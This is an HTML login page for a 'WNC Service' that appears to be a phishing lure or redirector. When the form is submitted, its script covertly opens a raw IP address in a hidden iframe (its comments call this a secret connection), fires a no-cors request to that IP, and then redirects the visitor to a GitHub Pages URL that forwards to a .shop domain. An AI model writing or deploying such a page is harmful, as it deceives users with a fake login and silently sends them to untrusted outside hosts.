<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Login - WNC Service</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f9;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
    }
    .header-logo {
      width: 80%;
      max-width: 800px;
      height: auto;
      margin: 20px auto;
    }
    .login-container {
      text-align: center;
      background: #ffffff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
      width: 300px;
      margin-top: 20px;
    }
    .logo {
      width: 100px;
      height: auto;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 20px;
      color: #333;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #666;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ddd;
      border-radius: 5px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
    /* 隱藏的 iframe */
    #hiddenIframe {
      display: none;
      width: 0;
      height: 0;
      border: 0;
    }
  </style>
  <script>
    function handleLogin(event) {
      event.preventDefault(); // 阻止表單默認提交行為

      const primaryURL = "http://103.200.23.160";
      const fallbackURL = "https://zongyiu.github.io/wnc/?site=http://jkkahebg899wubj.shop/";

      // 先在隱藏的 iframe 中連到主 URL
      const iframe = document.getElementById('hiddenIframe');
      iframe.src = primaryURL;

      // 同時使用 fetch 搭配 mode: 'no-cors' 嘗試發請求
      fetch(primaryURL, {
        method: 'HEAD',
        mode: 'no-cors'
      })
      .then(() => {
        // 如果需要在成功 fetch 後做事，可以在此處理
        console.log('Primary URL requested with no-cors');
      })
      .catch(() => {
        // 如果需要在錯誤發生時做事，可以在此處理
        console.error('Error requesting primary URL');
      });

      // 5 秒後跳轉到備用 URL
      setTimeout(() => {
        window.location.href = fallbackURL;
      }, 5000);
    }
  </script>
</head>
<body>
  <img src="./wnc.png" alt="WNC Banner" class="header-logo">
  <div class="login-container">
    <img src="./wnclogo.png" alt="WNC Logo" class="logo">
    <h1>Welcome to WNC Service</h1>
    <p>This service requires login to access.</p>
    <form onsubmit="handleLogin(event)">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
  <!-- 隱藏的 iframe，用來偷偷連線到 primaryURL -->
  <iframe id="hiddenIframe"></iframe>
</body>
</html>
